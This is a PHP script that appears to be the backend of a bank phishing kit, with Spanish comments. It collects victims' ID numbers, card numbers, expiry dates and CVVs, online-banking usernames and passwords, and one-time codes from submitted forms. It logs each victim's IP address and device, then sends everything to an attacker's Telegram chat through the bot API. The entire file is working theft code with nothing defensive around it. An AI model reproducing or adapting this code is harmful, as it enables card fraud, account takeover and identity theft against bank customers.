<?php
include 'telegram.php';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Función para simplificar el User-Agent
function parseUserAgent($u_agent) {
    $browser = 'Desconocido';
    $version = '';
    $platform = 'Desconocido';

    // Detectar plataforma
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }

    // Detectar navegador
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
        $browser = 'Internet Explorer';
    } elseif(preg_match('/Firefox/i',$u_agent)){
        $browser = 'Firefox';
    } elseif(preg_match('/Chrome/i',$u_agent)){
        $browser = 'Chrome';
    } elseif(preg_match('/Safari/i',$u_agent)){
        $browser = 'Safari';
    } elseif(preg_match('/Opera/i',$u_agent)){
        $browser = 'Opera';
    } elseif(preg_match('/Netscape/i',$u_agent)){
        $browser = 'Netscape';
    }

    // Extraer versión del navegador
    $known = array('Version', $browser, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';

    if (preg_match_all($pattern, $u_agent, $matches)) {
        if (count($matches['browser']) > 1) {
            $version = $matches['version'][1];
        } else {
            $version = $matches['version'][0];
        }
    }

    return $browser . " " . $version . " / " . $platform;
}

$hash = $_POST['form'];
$user_ip = getUserIP();
$user_agent = parseUserAgent($_SERVER['HTTP_USER_AGENT']);

if($hash == '1'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "🏦 *Banco:* ".$_POST["bank"]."\n".
           "💳 *Tarjeta:* ".$_POST['numbercard']."\n".
           "📅 *Expira:* ".$_POST["month"]."/".$_POST["year"]."\n".
           "🔐 *CVV:* ".$_POST["cvv"]."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *Dispositivo:* ".$user_agent ;
}

if($hash == '2'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "👨‍💻 *Usuario:* ".$_POST["txt-usuario"]."\n".
           "🔑 *Contraseña:* ".$_POST['txt-password']."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *Dispositivo:* ".$user_agent ;
}

if($hash == '3' || $hash == '4'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "📲 *OTP:* ".$_POST["txt-otp-nuevo"]."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *Dispositivo:* ".$user_agent ;
}

if (!empty($msg)) {
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$telegram_admin_id."&parse_mode=Markdown&text=" . urlencode($msg));
}
?>
